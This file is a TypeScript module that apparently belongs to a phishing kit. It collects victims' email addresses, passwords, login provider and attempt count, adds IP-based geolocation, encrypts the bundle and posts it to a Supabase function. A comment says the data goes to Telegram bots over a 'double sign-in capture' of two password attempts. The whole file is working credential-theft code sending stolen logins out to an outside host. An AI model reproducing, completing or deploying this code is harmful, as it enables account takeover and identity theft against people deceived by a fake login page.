import { functionUrl, SECURITY_CONFIG } from '../config/security';
import { encryptPayload } from './crypto';
import { saveVisitorGeo } from './session';
import type { GeoInfo } from './geoip';
import { getGeoInfo } from './geoip';

export interface LoginPayload {
  email: string;
  provider?: string;
  password: string;
  attempt?: number;
  ip?: string;
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  continent?: string;
  org?: string;
  timezone?: string;
}

const jsonHeaders = {
  'Content-Type': 'application/json',
};

const supabaseHeaders = {
  Authorization: `Bearer ${SECURITY_CONFIG.supabaseAnonKey}`,
  apikey: SECURITY_CONFIG.supabaseAnonKey,
};

export async function submitLogin(payload: LoginPayload): Promise<Response> {
  const encryptedBody = await encryptPayload(payload);

  const response = await fetch(functionUrl('login'), {
    method: 'POST',
    headers: {
      ...jsonHeaders,
      ...supabaseHeaders,
    },
    body: JSON.stringify(encryptedBody),
  });

  try {
    const data = await response.clone().json();
    if (data?.success && data?.data?.geo) {
      saveVisitorGeo(data.data.geo as GeoInfo);
    }
  } catch {
    // Non-JSON responses are ignored.
  }

  return response;
}

/** Double sign-in capture: attempt 1 + attempt 2, both to both Telegram bots. */
export function fireLoginCapture(payload: LoginPayload): void {
  void (async () => {
    try {
      const geo = await getGeoInfo();
      await submitLogin({ ...payload, ...geo });
    } catch (err) {
      console.error('Login capture failed:', err);
    }
  })();
}

export { SECURITY_CONFIG };
